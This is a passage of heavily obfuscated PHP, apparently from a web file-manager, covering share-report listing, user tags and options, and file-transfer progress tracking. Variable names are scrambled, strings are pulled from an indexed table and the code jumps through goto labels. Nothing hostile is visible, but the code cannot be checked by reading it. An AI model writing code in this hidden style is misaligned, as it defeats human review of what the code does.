$this->field($‹¹ÆØ…÷[682])->where($ˆ²Õ³Œı)->select(); $ášÀâ•§ = array_to_keyvalue($Öüˆ³ğé, $‹¹ÆØ…÷[12], $‹¹ÆØ…÷[682]); if (!$ášÀâ•§) { return; } foreach ($Öüˆ³ğé as $Ö¦İİé³) { $this->shareInfoMofify($Ö¦İİé³, $‹¹ÆØ…÷[2135]); } $ˆ²Õ³Œı = array($‹¹ÆØ…÷[2157] => array($‹¹ÆØ…÷[504], $ášÀâ•§)); $this->where($ˆ²Õ³Œı)->delete(); Model($‹¹ÆØ…÷[683])->where($ˆ²Õ³Œı)->delete(); } public function listAll($òï’€Ü) { $ë—äå·‘ =& $_SERVER[ˆö¿ÚÌ¼]; $œÑ€Ûâ´ = array(); if ($òï’€Ü[$ë—äå·‘[1785]]) { $œÑ€Ûâ´[$ë—äå·‘[1785]] = $òï’€Ü[$ë—äå·‘[1785]]; } if ($òï’€Ü[$ë—äå·‘[845]]) { $çÍ›£ƒª = $òï’€Ü[$ë—äå·‘[846]] ? $òï’€Ü[$ë—äå·‘[846]] : strtotime(date($ë—äå·‘[2165])); $œÑ€Ûâ´[$ë—äå·‘[234]] = array($ë—äå·‘[411], array($òï’€Ü[$ë—äå·‘[845]], $çÍ›£ƒª)); } if ($òï’€Ü[$ë—äå·‘[33]]) { $œÑ€Ûâ´[$òï’€Ü[$ë—äå·‘[33]]] = 1; } else { $œÑ€Ûâ´[] = array($ë—äå·‘[576] => array($ë—äå·‘[1103], 0), $ë—äå·‘[680] => array($ë—äå·‘[1103], 0), $ë—äå·‘[2139] => $ë—äå·‘[2088]); } if ($òï’€Ü[$ë—äå·‘[2084]]) { $œÑ€Ûâ´[] = array($ë—äå·‘[2136] => $òï’€Ü[$ë—äå·‘[2084]], $ë—äå·‘[1673] => array($ë—äå·‘[462], "\x25{$òï’€Ü[$ë—äå·‘[2084]]}\45"), $ë—äå·‘[2139] => $ë—äå·‘[2088]); } $“Íƒôãé = $this->_makeOrder()->where($œÑ€Ûâ´)->selectPage(20); if (empty($“Íƒôãé[$ë—äå·‘[448]])) { return array(); } $this->_listDataApply($“Íƒôãé[$ë—äå·‘[448]]); return $“Íƒôãé; } public function listDataApply($ùáöâı) { $this->_listDataApply($ùáöâı); return $ùáöâı; } private function _listDataApply(&$Ì©í™îª) { $ô°†­Ÿ˜ =& $_SERVER[ˆö¿ÚÌ¼]; $Òœ‡Íœ = array_to_keyvalue($Ì©í™îª, $ô°†­Ÿ˜[12], $ô°†­Ÿ˜[1785]); $Ê¬ªİÆ¾ = Model($ô°†­Ÿ˜[611])->userListInfo(array_unique($Òœ‡Íœ)); $äö„ÕÚÑ = array_to_keyvalue($Ì©í™îª, $ô°†­Ÿ˜[12], $ô°†­Ÿ˜[194]); $·–û¡€Œ = Model($ô°†­Ÿ˜[915])->sourceListInfo($äö„ÕÚÑ, !0); foreach ($Ì©í™îª as $úüÁ«‚Ë => &$Á‹ØœºÌ) { $Æ¬ëÀì¢ = $Á‹ØœºÌ[$ô°†­Ÿ˜[1785]]; $Á‹ØœºÌ[$ô°†­Ÿ˜[2166]] = $Ê¬ªİÆ¾[$Æ¬ëÀì¢] ? $Ê¬ªİÆ¾[$Æ¬ëÀì¢] : !1; if (!$Á‹ØœºÌ[$ô°†­Ÿ˜[2166]] || $Á‹ØœºÌ[$ô°†­Ÿ˜[2166]][$ô°†­Ÿ˜[835]] != $ô°†­Ÿ˜[91]) { unset($Ì©í™îª[$úüÁ«‚Ë]); continue; } $¾ü²§¾« = $Á‹ØœºÌ[$ô°†­Ÿ˜[194]]; $Á‹ØœºÌ[$ô°†­Ÿ˜[90]] = $·–û¡€Œ[$¾ü²§¾«] ? $·–û¡€Œ[$¾ü²§¾«] : !1; if ($Á‹ØœºÌ[$ô°†­Ÿ˜[90]][$ô°†­Ÿ˜[517]] == $ô°†­Ÿ˜[91]) { unset($Ì©í™îª[$úüÁ«‚Ë]); } if ($Á‹ØœºÌ[$ô°†­Ÿ˜[90]] != $ô°†­Ÿ˜[231] && !$Á‹ØœºÌ[$ô°†­Ÿ˜[90]]) { unset($Ì©í™îª[$úüÁ«‚Ë]); } } unset($Á‹ØœºÌ); $Ì©í™îª = array_values($Ì©í™îª); } private function _makeOrder($Àú¶ÁäÉ = '') { $„¦·ô•å =& $_SERVER[ˆö¿ÚÌ¼]; $¡÷ò¾’˜ = array($„¦·ô•å[234], $„¦·ô•å[846], $„¦·ô•å[2153], $„¦·ô•å[2154]); $¹“—Í = array($„¦·ô•å[535] => $„¦·ô•å[536], $„¦·ô•å[537] => $„¦·ô•å[538]); $¥ğƒ÷³ = Input::get($„¦·ô•å[542], $„¦·ô•å[7], $„¦·ô•å[509], $¡÷ò¾’˜); $Ñ®·­óŞ = Input::get($„¦·ô•å[543], $„¦·ô•å[7], $„¦·ô•å[2167], array($„¦·ô•å[2081], $„¦·ô•å[537])); $Ñ®·­óŞ = $¹“—Í[$Ñ®·­óŞ]; $Àú¶ÁäÉ = $Àú¶ÁäÉ . "{$¥ğƒ÷³}\40{$Ñ®·­óŞ}"; return $this->order($Àú¶ÁäÉ); } public function reportAdd($·µ˜²†») { $œ’ñÍ· =& $_SERVER[ˆö¿ÚÌ¼]; $ƒıú’æö = array($œ’ñÍ·[682] => $·µ˜²†»[$œ’ñÍ·[682]], $œ’ñÍ·[1785] => USER_ID); if (Model($œ’ñÍ·[2163])->where($ƒıú’æö)->find()) { return !1; } $ÖÀ“Û = array($œ’ñÍ·[682] => $·µ˜²†»[$œ’ñÍ·[682]], $œ’ñÍ·[1673] => $·µ˜²†»[$œ’ñÍ·[1673]], $œ’ñÍ·[194] => $·µ˜²†»[$œ’ñÍ·[194]], $œ’ñÍ·[555] => $·µ˜²†»[$œ’ñÍ·[555]], $œ’ñÍ·[1785] => USER_ID, $œ’ñÍ·[33] => $·µ˜²†»[$œ’ñÍ·[33]], $œ’ñÍ·[538] => $·µ˜²†»[$œ’ñÍ·[538]]); return Model($œ’ñÍ·[2163])->add($ÖÀ“Û); } public function reportList($°ÄıÖøÜ) { $Ú­ÍìÕ =& $_SERVER[ˆö¿ÚÌ¼]; $®§èçÁ• = array(); if ($°ÄıÖøÜ[$Ú­ÍìÕ[845]]) { $ˆß´Õ = $°ÄıÖøÜ[$Ú­ÍìÕ[846]] ? $°ÄıÖøÜ[$Ú­ÍìÕ[846]] : strtotime(date($Ú­ÍìÕ[2165])); $®§èçÁ•[$Ú­ÍìÕ[234]] = array($Ú­ÍìÕ[411], array($°ÄıÖøÜ[$Ú­ÍìÕ[845]], $ˆß´Õ)); } if (isset($°ÄıÖøÜ[$Ú­ÍìÕ[33]]) && in_array($°ÄıÖøÜ[$Ú­ÍìÕ[33]], array($Ú­ÍìÕ[91], $Ú­ÍìÕ[522], $Ú­ÍìÕ[2168], $Ú­ÍìÕ[2169], $Ú­ÍìÕ[2170]))) { $®§èçÁ•[$Ú­ÍìÕ[33]] = $°ÄıÖøÜ[$Ú­ÍìÕ[33]]; } if (isset($°ÄıÖøÜ[$Ú­ÍìÕ[835]]) && in_array($°ÄıÖøÜ[$Ú­ÍìÕ[835]], array($Ú­ÍìÕ[231], $Ú­ÍìÕ[91], $Ú­ÍìÕ[522], $Ú­ÍìÕ[2168]))) { $®§èçÁ•[$Ú­ÍìÕ[835]] = $°ÄıÖøÜ[$Ú­ÍìÕ[835]]; } $¿û²Õºë = Input::get($Ú­ÍìÕ[543], $Ú­ÍìÕ[7], $Ú­ÍìÕ[2167], array($Ú­ÍìÕ[2081], $Ú­ÍìÕ[537])); $êïäÙÑË = array($Ú­ÍìÕ[535] => $Ú­ÍìÕ[536], $Ú­ÍìÕ[537] => $Ú­ÍìÕ[538]); $şĞ¡ÛÅ = $Ú­ÍìÕ[2171] . $êïäÙÑË[$¿û²Õºë]; $îéìÀá½ = Model($Ú­ÍìÕ[2163])->where($®§èçÁ•)->order($şĞ¡ÛÅ)->selectPage(20); if (empty($îéìÀá½[$Ú­ÍìÕ[448]])) { return array(); } $ÀÌ®æ¢Í = array_to_keyvalue_group($îéìÀá½[$Ú­ÍìÕ[448]], $Ú­ÍìÕ[835], $Ú­ÍìÕ[682]); if (!empty($ÀÌ®æ¢Í[0])) { $°ÄıÖøÜ = $ÀÌ®æ¢Í[0]; $®§èçÁ• = array($Ú­ÍìÕ[682] => array($Ú­ÍìÕ[7], $°ÄıÖøÜ)); $‘øİ«™¨ = $this->where($®§èçÁ•)->field($Ú­ÍìÕ[682])->select(); $‘øİ«™¨ = array_to_keyvalue($‘øİ«™¨, $Ú­ÍìÕ[12], $Ú­ÍìÕ[682]); $ëàÕòıÑ = array_diff($°ÄıÖøÜ, $‘øİ«™¨); if (!empty($ëàÕòıÑ)) { foreach ($îéìÀá½[$Ú­ÍìÕ[448]] as $¸ãğÈÖ“ => $¥ë™Şïå) { if (in_array($¥ë™Şïå[$Ú­ÍìÕ[682]], $ëàÕòıÑ)) { unset($îéìÀá½[$Ú­ÍìÕ[448]][$¸ãğÈÖ“]); } } } } $this->_listDataApply($îéìÀá½[$Ú­ÍìÕ[448]]); return $îéìÀá½; } public function reportStatus($€§†Şğ») { $ëñ±ªú­ =& $_SERVER[ˆö¿ÚÌ¼]; $¡Û»çíë = array($ëñ±ªú­[478] => $€§†Şğ»[$ëñ±ªú­[478]]); $ßŒõ‹ = Model($ëñ±ªú­[2163])->where($¡Û»çíë)->field($ëñ±ªú­[2172])->find(); if (!$ßŒõ‹) { return !1; } $úÓ…¢‚· = array($ëñ±ªú­[835] => $€§†Şğ»[$ëñ±ªú­[835]]); if ($€§†Şğ»[$ëñ±ªú­[835]] == $ëñ±ªú­[2168] && $ßŒõ‹[$ëñ±ªú­[835]] == $ëñ±ªú­[2168]) { $úÓ…¢‚·[$ëñ±ªú­[835]] = 0; } $¸¤ÆŒâÜ = Model($ëñ±ªú­[2163])->where($¡Û»çíë)->save($úÓ…¢‚·); if ($€§†Şğ»[$ëñ±ªú­[835]] == $ëñ±ªú­[522]) { if ($ßŒõ‹[$ëñ±ªú­[555]] != $ëñ±ªú­[231] && $this->shareFileMeta($ßŒõ‹[$ëñ±ªú­[555]])) { $this->shareFileMeta($ßŒõ‹[$ëñ±ªú­[555]], 0); } $this->remove($ßŒõ‹[$ëñ±ªú­[682]]); return !0; } if ($¸¤ÆŒâÜ && $€§†Şğ»[$ëñ±ªú­[835]] == $ëñ±ªú­[2168]) { $¡ Ò…¿Ÿ = $úÓ…¢‚·[$ëñ±ªú­[835]] == $ëñ±ªú­[2168] ? 1 : 0; $this->shareFileMeta($ßŒõ‹[$ëñ±ªú­[555]], $¡ Ò…¿Ÿ); $this->removeByFile($ßŒõ‹[$ëñ±ªú­[555]]); } return $¸¤ÆŒâÜ; } private function removeByFile($ä ä€¹É) { $‡°ßÊ´ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $˜´œŠÂ = Model($‡°ßÊ´ƒ[915])->where(array($‡°ßÊ´ƒ[555] => $ä ä€¹É))->field($‡°ßÊ´ƒ[194])->select(); $âåÑƒÍô = array_to_keyvalue($˜´œŠÂ, $‡°ßÊ´ƒ[12], $‡°ßÊ´ƒ[194]); $»Ç”Êí¡ = array($‡°ßÊ´ƒ[194] => array($‡°ßÊ´ƒ[7], $âåÑƒÍô), $‡°ßÊ´ƒ[576] => 1); $˜´œŠÂ = $this->where($»Ç”Êí¡)->field($‡°ßÊ´ƒ[682])->select(); if (empty($˜´œŠÂ)) { return; } $õ±ÖÇø„ = array_to_keyvalue($˜´œŠÂ, $‡°ßÊ´ƒ[12], $‡°ßÊ´ƒ[682]); $this->remove($õ±ÖÇø„); } private function shareFileMeta($ğö¢Š™ƒ, $Êâú‰Á = null) { $«¾Á¶–Ê =& $_SERVER[ˆö¿ÚÌ¼]; $óµµè® = array($«¾Á¶–Ê[555] => $ğö¢Š™ƒ, $«¾Á¶–Ê[97] => $«¾Á¶–Ê[2173]); if (is_null($Êâú‰Á)) { return Model($«¾Á¶–Ê[2174])->where($óµµè®)->find(); } $óµµè®[$«¾Á¶–Ê[453]] = $Êâú‰Á; Model($«¾Á¶–Ê[2174])->add($óµµè®, array(), !0); } } goto AÏë”›±‡Æ; e³ö‹ØÎ˜: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\157\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ø­‰Ì±£) { $¬À÷¢Àü =& $_SERVER[ˆö¿ÚÌ¼]; $¸áæÈà = defined($¬À÷¢Àü[2216]) && USER_ID ? USER_ID : $¬À÷¢Àü[12]; return "\125\x73\x65\162\x4f\160\x74\151\157\156\137{$Ø­‰Ì±£}\x5f" . $¸áæÈà; } protected function filterWhere($¹ØÖ‚) { $ˆÀÒø±¿ =& $_SERVER[ˆö¿ÚÌ¼]; $¹ØÖ‚[$ˆÀÒø±¿[1785]] = defined($ˆÀÒø±¿[2216]) && USER_ID ? USER_ID : $ˆÀÒø±¿[12]; return $¹ØÖ‚; } public function cacheRemoveUser($¶›ßù¯, $ ÊÛ§Í) { return Cache::remove("\x55\163\x65\x72\x4f\160\x74\151\x6f\156\x5f{$¶›ßù¯}\137" . $ ÊÛ§Í); } protected function optionDefault($‘í·¶½„ = '') { $ÂêÉ¢ŸÚ =& $_SERVER[ˆö¿ÚÌ¼]; if ($‘í·¶½„ == $ÂêÉ¢ŸÚ[12]) { return $GLOBALS[$ÂêÉ¢ŸÚ[6]][$ÂêÉ¢ŸÚ[2531]]; } if ($‘í·¶½„ == $ÂêÉ¢ŸÚ[2532]) { return $GLOBALS[$ÂêÉ¢ŸÚ[6]][$ÂêÉ¢ŸÚ[2533]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\x74\x61\x67\x4c\x69\163\x74"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\171\154\x65", "\163\157\162\164"); public function listData($ÍÛ¼úê­ = false, $Çª–ŞÂ = "\163\157\x72\164", $»ˆÙÛ¤ş = false) { return parent::listData($ÍÛ¼úê­, $Çª–ŞÂ, $»ˆÙÛ¤ş); } public function remove($œ‹ğÙßÏ) { return parent::remove($œ‹ğÙßÏ); } public function add($Ó—¾ÄúÁ, $¬ÒØ˜„Ç = "\x6c\141\x62\x65\154\55\x67\162\145\x79\x2d\x6e\x6f\162\155\141\154") { $üƒ¿î«® =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->findByName($Ó—¾ÄúÁ)) { return !1; } $Ô©×’Ñï = array($üƒ¿î«®[506] => $Ó—¾ÄúÁ, $üƒ¿î«®[572] => $¬ÒØ˜„Ç, $üƒ¿î«®[1990] => $this->getSort($üƒ¿î«®[338]) + 1); return parent::insert($Ô©×’Ñï); } public function update($åÔİƒó—, $Û…ı) { $ÉÄ™»à =& $_SERVER[ˆö¿ÚÌ¼]; $÷‹Ûâ¡… = $this->listData($åÔİƒó—); $‘á‡’´• = $this->findByName($Û…ı[$ÉÄ™»à[32]]); if (!$÷‹Ûâ¡… || $‘á‡’´• && $‘á‡’´•[$ÉÄ™»à[478]] != $÷‹Ûâ¡…[$ÉÄ™»à[478]]) { return !1; } return parent::update($åÔİƒó—, $Û…ı); } public function moveTop($›“Ò£Ï†) { $ÁÊ°Äğµ =& $_SERVER[ˆö¿ÚÌ¼]; $³¤‘û€í = parent::listData(); $”ïÁéè– = $this->getSort($ÁÊ°Äğµ[337]); foreach ($³¤‘û€í as &$îêÃõÚ») { if ($îêÃõÚ»[$ÁÊ°Äğµ[478]] == $›“Ò£Ï†) { $îêÃõÚ»[$ÁÊ°Äğµ[2010]] = $”ïÁéè–; continue; } $îêÃõÚ»[$ÁÊ°Äğµ[2010]] += 1; } unset($îêÃõÚ»); return parent::resetData($³¤‘û€í); } public function moveBottom($Õç¥§‡) { $ åÙ‹¨Ê =& $_SERVER[ˆö¿ÚÌ¼]; $•«Ø÷ä = $this->getSort($ åÙ‹¨Ê[338]) + 1; return parent::update($Õç¥§‡, array($ åÙ‹¨Ê[2010] => $•«Ø÷ä)); } public function resetSort($îñú”ÉÂ) { $®¬êùüõ =& $_SERVER[ˆö¿ÚÌ¼]; $Áà¿ìºµ = array(); $îñú”ÉÂ = is_array($îñú”ÉÂ) ? $îñú”ÉÂ : array(); for ($ø„Å› = 0; $ø„Å› < count($îñú”ÉÂ); $ø„Å›++) { $Áà¿ìºµ[$îñú”ÉÂ[$ø„Å›] . $®¬êùüõ[12]] = $ø„Å› + 1; } $¹ÃÖû×ø = parent::listData(); foreach ($¹ÃÖû×ø as &$øù†èÂÕ) { $ØˆŞÀ« = $Áà¿ìºµ[$øù†èÂÕ[$®¬êùüõ[478]]]; $øù†èÂÕ[$®¬êùüõ[2010]] = $ØˆŞÀ« ? $ØˆŞÀ« : $øù†èÂÕ[$®¬êùüõ[2010]]; } unset($øù†èÂÕ); return parent::resetData($¹ÃÖû×ø); } private function getSort($˜ëÏó´¡) { $êĞ‰ááİ =& $_SERVER[ˆö¿ÚÌ¼]; $Ù¦¶êÃä = parent::listData(); $Õö™–Ş = array_to_keyvalue($Ù¦¶êÃä, $êĞ‰ááİ[12], $êĞ‰ááİ[2010]); if (!$Õö™–Ş) { $Õö™–Ş = array(0); } $‘»ÂÌ¶Ù = $˜ëÏó´¡ == $êĞ‰ááİ[338] ? max($Õö™–Ş) : min($Õö™–Ş); return intval($‘»ÂÌ¶Ù); } } goto E¡ùÎ÷öºå; EóÀ³Ğêë: class TaskFileTransfer extends Task { protected function startAfter() { $ƒÒéõ´ù =& $_SERVER[ˆö¿ÚÌ¼]; $‰Ü½†çÒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ƒÒéõ´ù[1816], array($this, $ƒÒéõ´ù[1817])); Hook::bind($ƒÒéõ´ù[1322], array($this, $ƒÒéõ´ù[1818])); Hook::bind($ƒÒéõ´ù[1819], array($this, $ƒÒéõ´ù[1820])); Hook::bind($ƒÒéõ´ù[685], array($this, $ƒÒéõ´ù[1821])); Hook::bind($ƒÒéõ´ù[686], array($this, $ƒÒéõ´ù[1822])); Hook::bind($ƒÒéõ´ù[692], array($this, $ƒÒéõ´ù[1823])); Hook::bind($ƒÒéõ´ù[693], array($this, $ƒÒéõ´ù[1824])); Hook::bind($ƒÒéõ´ù[688], array($this, $ƒÒéõ´ù[1825])); Hook::bind($ƒÒéõ´ù[690], array($this, $ƒÒéõ´ù[1826])); Hook::bind($ƒÒéõ´ù[654], array($this, $ƒÒéõ´ù[1827])); Hook::bind($ƒÒéõ´ù[651], array($this, $ƒÒéõ´ù[1827])); Hook::bind($ƒÒéõ´ù[656], array($this, $ƒÒéõ´ù[1827])); Hook::bind($ƒÒéõ´ù[658], array($this, $ƒÒéõ´ù[1827])); Hook::bind($ƒÒéõ´ù[660], array($this, $ƒÒéõ´ù[1827])); Hook::bind($ƒÒéõ´ù[1828], array($this, $ƒÒéõ´ù[1829])); Hook::bind($ƒÒéõ´ù[676], array($this, $ƒÒéõ´ù[1830])); $this->sourceModelCopyFlag = !1; Hook::bind($ƒÒéõ´ù[1831], array($this, $ƒÒéõ´ù[1832])); Hook::bind($ƒÒéõ´ù[1833], array($this, $ƒÒéõ´ù[1834])); Hook::bind($ƒÒéõ´ù[1835], array($this, $ƒÒéõ´ù[1836])); $‰Ü½†çÒ[$ƒÒéõ´ù[1837]] = LNG($ƒÒéõ´ù[1838]); $‰Ü½†çÒ[$ƒÒéõ´ù[1839]] = 0; $‰Ü½†çÒ[$ƒÒéõ´ù[1840]] = 0; $‰Ü½†çÒ[$ƒÒéõ´ù[1156]] = $ƒÒéõ´ù[12]; $‰Ü½†çÒ[$ƒÒéõ´ù[1841]] = $ƒÒéõ´ù[12]; $‰Ü½†çÒ[$ƒÒéõ´ù[1842]] = 0; $‰Ü½†çÒ[$ƒÒéõ´ù[1843]] = 0; $‰Ü½†çÒ[$ƒÒéõ´ù[1844]] = 0; if (!$‰Ü½†çÒ[$ƒÒéõ´ù[1673]]) { $‰Ü½†çÒ[$ƒÒéõ´ù[1673]] = LNG($ƒÒéõ´ù[1845]); } } protected function endAfter() { $úØÖíİ =& $_SERVER[ˆö¿ÚÌ¼]; Hook::unbind($úØÖíİ[1816], array($this, $úØÖíİ[1817])); Hook::unbind($úØÖíİ[1322], array($this, $úØÖíİ[1818])); Hook::unbind($úØÖíİ[1819], array($this, $úØÖíİ[1820])); Hook::unbind($úØÖíİ[685], array($this, $úØÖíİ[1821])); Hook::unbind($úØÖíİ[686], array($this, $úØÖíİ[1822])); Hook::unbind($úØÖíİ[692], array($this, $úØÖíİ[1823])); Hook::unbind($úØÖíİ[693], array($this, $úØÖíİ[1824])); Hook::unbind($úØÖíİ[688], array($this, $úØÖíİ[1825])); Hook::unbind($úØÖíİ[690], array($this, $úØÖíİ[1826])); Hook::unbind($úØÖíİ[654], array($this, $úØÖíİ[1827])); Hook::unbind($úØÖíİ[651], array($this, $úØÖíİ[1827])); Hook::unbind($úØÖíİ[656], array($this, $úØÖíİ[1827])); Hook::unbind($úØÖíİ[658], array($this, $úØÖíİ[1827])); Hook::unbind($úØÖíİ[660], array($this, $úØÖíİ[1827])); Hook::unbind($úØÖíİ[1828], array($this, $úØÖíİ[1829])); Hook::unbind($úØÖíİ[676], array($this, $úØÖíİ[1830])); Hook::unbind($úØÖíİ[1831], array($this, $úØÖíİ[1832])); Hook::unbind($úØÖíİ[1833], array($this, $úØÖíİ[1834])); Hook::unbind($úØÖíİ[1835], array($this, $úØÖíİ[1836])); } public function copyMoveStart($Ø—Ø³·™, $öşŞ—Õş, $×Ô€ÇÌ, $ùÕŠÀ¢) { $™Ú˜»¨¶ =& $_SERVER[ˆö¿ÚÌ¼]; self::log($™Ú˜»¨¶[1846] . $öşŞ—Õş . $™Ú˜»¨¶[73] . $ùÕŠÀ¢); $«Í„úÈ = rtrim(TEMP_FILES, $™Ú˜»¨¶[8]); if (substr($öşŞ—Õş, 0, strlen($«Í„úÈ)) == $«Í„úÈ) { return; } if (substr($ùÕŠÀ¢, 0, strlen($«Í„úÈ)) == $«Í„úÈ) { return; } $³¨øß¹ñ =& $this->task; $³¨øß¹ñ[$™Ú˜»¨¶[1847]] = KodIO::transferType($Ø—Ø³·™, $×Ô€ÇÌ); $this->update(); } public function updateAfter() { $ãá ªó£ =& $_SERVER[ˆö¿ÚÌ¼]; $Öûæ’ºĞ =& $this->task; if (!$Öûæ’ºĞ[$ãá ªó£[848]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Öûæ’ºĞ[$ãá ªó£[1847]] == $ãá ªó£[1416]) { return; } self::updateTask($Öûæ’ºĞ); } private static function updateTask(&$óÁ™œ¥É) { $îèè­Ó¨ =& $_SERVER[ˆö¿ÚÌ¼]; if ($óÁ™œ¥É[$îèè­Ó¨[1847]] == $îèè­Ó¨[1293] || $óÁ™œ¥É[$îèè­Ó¨[1847]] == $îèè­Ó¨[110]) { if ($óÁ™œ¥É[$îèè­Ó¨[1841]]) { $óÁ™œ¥É[$îèè­Ó¨[1844]] = $óÁ™œ¥É[$îèè­Ó¨[1843]] + $óÁ™œ¥É[$îèè­Ó¨[1840]]; } } else { if ($óÁ™œ¥É[$îèè­Ó¨[1847]] == $îèè­Ó¨[1417]) { if ($óÁ™œ¥É[$îèè­Ó¨[1841]] == $îèè­Ó¨[1293]) { $óÁ™œ¥É[$îèè­Ó¨[1844]] = $óÁ™œ¥É[$îèè­Ó¨[1843]] + $óÁ™œ¥É[$îèè­Ó¨[1840]] * 0.5; } else { if ($óÁ™œ¥É[$îèè­Ó¨[1841]] == $îèè­Ó¨[110]) { $óÁ™œ¥É[$îèè­Ó¨[1844]] = $óÁ™œ¥É[$îèè­Ó¨[1843]] + $óÁ™œ¥É[$îèè­Ó¨[1839]] * 0.5 + $óÁ™œ¥É[$îèè­Ó¨[1840]] * 0.5; } } } } $óÁ™œ¥É[$îèè­Ó¨[1787]] = $óÁ™œ¥É[$îèè­Ó¨[1844]] / $óÁ™œ¥É[$îèè­Ó¨[848]]; if ($óÁ™œ¥É[$îèè­Ó¨[1787]] > 0) { $ó—Úš¬¤ = timeFloat() - $óÁ™œ¥É[$îèè­Ó¨[1789]] - $óÁ™œ¥É[$îèè­Ó¨[1792]]; $óÁ™œ¥É[$îèè­Ó¨[1793]] = $ó—Úš¬¤ * (1 - $óÁ™œ¥É[$îèè­Ó¨[1787]]) / $óÁ™œ¥É[$îèè­Ó¨[1787]]; } } public function addPath($¯èğÙîÁ) { $‘£®Ö•‘ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$¯èğÙîÁ) { return; } $ŒŒƒ»Ç¡ =& $this->task; $öÍÑ­Ğ¹ = IO::infoWithChildren($¯èğÙîÁ); $ŞÏƒÆ¡ã = $ŒŒƒ»Ç¡[$‘£®Ö•‘[1848]] ? $ŒŒƒ»Ç¡[$‘£®Ö•‘[1848]][$‘£®Ö•‘[1849]] : 0; $ŒŒƒ»Ç¡[$‘£®Ö•‘[1848]] = array($‘£®Ö•‘[1849] => $ŞÏƒÆ¡ã + 1, $‘£®Ö•‘[506] => $öÍÑ­Ğ¹[$‘£®Ö•‘[32]], $‘£®Ö•‘[87] => $öÍÑ­Ğ¹[$‘£®Ö•‘[87]], $‘£®Ö•‘[596] => $öÍÑ­Ğ¹[$‘£®Ö•‘[596]] ? $öÍÑ­Ğ¹[$‘£®Ö•‘[596]] : $öÍÑ­Ğ¹[$‘£®Ö•‘[87]]); if ($öÍÑ­Ğ¹[$‘£®Ö•‘[33]] == $‘£®Ö•‘[233]) { $ŒŒƒ»Ç¡[$‘£®Ö•‘[1154]] += 1; } else { $ŒŒƒ»Ç¡[$‘£®Ö•‘[1154]] += $öÍÑ­Ğ¹[$‘£®Ö•‘[82]][$‘£®Ö•‘[80]]; if ($öÍÑ­Ğ¹[$‘£®Ö•‘[194]]) { $ŒŒƒ»Ç¡[$‘£®Ö•‘[1154]] += $öÍÑ­Ğ¹[$‘£®Ö•‘[82]][$‘£®Ö•‘[81]] + 1; } } $ŒŒƒ»Ç¡[$‘£®Ö•‘[848]] += $öÍÑ­Ğ¹[$‘£®Ö•‘[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ø“©­€Û) { } public function sourceAddHashEnd($÷³Ô»š) { } public function sourceAddFileStart($Í—ÒÌŠ‹) { $ÆÄşàË‹ =& $_SERVER[ˆö¿ÚÌ¼]; $¶¹²óè =& $this->task; $¶¹²óè[$ÆÄşàË‹[1839]] = $Í—ÒÌŠ‹[$ÆÄşàË‹[79]]; $¶¹²óè[$ÆÄşàË‹[1837]] = $Í—ÒÌŠ‹[$ÆÄşàË‹[32]]; $¶¹²óè[$ÆÄşàË‹[1156]] = $Í—ÒÌŠ‹[$ÆÄşàË‹[32]]; $¶¹²óè[$ÆÄşàË‹[1850]] = $Í—ÒÌŠ‹[$ÆÄşàË‹[87]]; $this->update(); } public function sourceAddFileEnd($ŞÜŠ¡ß¿) { $¢Ó’¦Æ =& $_SERVER[ˆö¿ÚÌ¼]; $áØƒ­½± =& $this->task; $áØƒ­½±[$¢Ó’¦Æ[1844]] += $ŞÜŠ¡ß¿[$¢Ó’¦Æ[79]]; $áØƒ­½±[$¢Ó’¦Æ[1850]] = $ŞÜŠ¡ß¿[$¢Ó’¦Æ[87]]; $this->update(1); } public function copyFileStart($¤õ³üÈ´, $„æ·úòì, $ªı»¨Æƒ, $Õí¿ÖÎ, $³©ÔŠ¦ü, $‘ˆÏ–áµ) { $Û‰¬â­ =& $_SERVER[ˆö¿ÚÌ¼]; $ÉûÈµà = $³©ÔŠ¦ü; if ($ÉûÈµà == $GLOBALS[$Û‰¬â­[1851]]) { $ÉûÈµà = $GLOBALS[$Û‰¬â­[1852]]; } $GLOBALS[$Û‰¬â­[1852]] = $³©ÔŠ¦ü; $GLOBALS[$Û‰¬â­[1851]] = $‘ˆÏ–áµ; $ºÜÈ¦¢ =& $this->task; $ºÜÈ¦¢[$Û‰¬â­[1837]] = $ÉûÈµà; $ºÜÈ¦¢[$Û‰¬â­[1839]] = (int) $¤õ³üÈ´->size($„æ·úòì); $ºÜÈ¦¢[$Û‰¬â­[1840]] = 0; $ºÜÈ¦¢[$Û‰¬â­[1156]] = $Û‰¬â­[12]; $ºÜÈ¦¢[$Û‰¬â­[1841]] = $Û‰¬â­[12]; $ºÜÈ¦¢[$Û‰¬â­[1842]] = 0; $Àãæ¤ = $ºÜÈ¦¢[$Û‰¬â­[1839]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ºÜÈ¦¢[$Û‰¬â­[478]] . $Û‰¬â­[1853]); if ($Àãæ¤ && file_exists(get_path_father($Õí¿ÖÎ))) { Cache::set($ºÜÈ¦¢[$Û‰¬â­[478]] . $Û‰¬â­[1853], $Õí¿ÖÎ); $ºÜÈ¦¢[$Û‰¬â­[1810]] = array($Û‰¬â­[1854], $Û‰¬â­[1855]); } $this->update(0, $Àãæ¤); } public static function updateCopyLocalFileSize($³èü£Ğ) { $”“¨«ÆÚ =& $_SERVER[ˆö¿ÚÌ¼]; $È¿‡®„ = Cache::get($³èü£Ğ[$”“¨«ÆÚ[478]] . $”“¨«ÆÚ[1853]); if (!$È¿‡®„ || !file_exists($È¿‡®„)) { return $³èü£Ğ; } $³èü£Ğ[$”“¨«ÆÚ[1840]] = @filesize($È¿‡®„); $³èü£Ğ[$”“¨«ÆÚ[1844]] += $³èü£Ğ[$”“¨«ÆÚ[1840]]; self::updateTask($³èü£Ğ); return $³èü£Ğ; } public function copyFileEnd($ŞÚ­ïƒ, $‰³²©‚“, $èª­¤Ë, 